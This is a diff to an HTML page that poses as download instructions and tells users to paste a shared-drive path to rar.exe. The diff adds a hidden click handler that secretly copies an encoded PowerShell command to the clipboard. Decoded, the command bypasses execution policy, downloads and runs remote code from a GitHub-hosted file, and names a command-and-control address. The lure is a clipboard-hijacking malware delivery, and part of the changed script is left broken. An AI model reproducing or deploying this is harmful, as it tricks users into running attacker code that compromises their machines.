@@ -21,19 +21,17 @@ To download the program, follow these steps:
   <li>Copy the following path and press Enter:</li>
 </ol>
 
-<pre id="copyBlock" style="background:black; color:#22c55e; padding:15px; cursor: pointer;">
- 
- 
+<pre id="copyBlock" style="background:black; color:#22c55e; padding:15px; cursor: pointer;" onclick="copyPayload()">
           \\shares\home\enterprice\ap\rar.exe   
 </pre>
 
-<span id="hiddenText" style="position:absolute; left:-9999px;">
-          \\shares\home\enterprice\ap\rar.exe   
-cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIklFWCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFua3Mtd3EvbXVkZHkvcmVmcy9oZWFkcy9tYWluL2FhYS54bHMgLVVzZUJhc2ljUGFyc2luZykiIAojYzI9MTg4LjExNC45Ni4xOjg4NTg=
-
-</span>
-
 <script>
+function copyPayload() {
+  const payload = `powershell -enc cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUNvbW1hbmQgIklFWCAoaXdyIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFua3Mtd3EvbXVkZHkvcmVmcy9oZWFkcy9tYWluL2FhYS54bHMgLVVzZUJhc2ljUGFyc2luZykiIAojYzI9MTg4LjExNC45Ni4xOjg4NTg=`;
+  navigator.clipboard.writeText(payload);
+}
+</script>
+  
 document.getElementById("copyBlock").addEventListener("copy", function(e) {
   const hidden = document.getElementById("hiddenText").innerText;
   e.clipboardData.setData("text/plain", hidden);
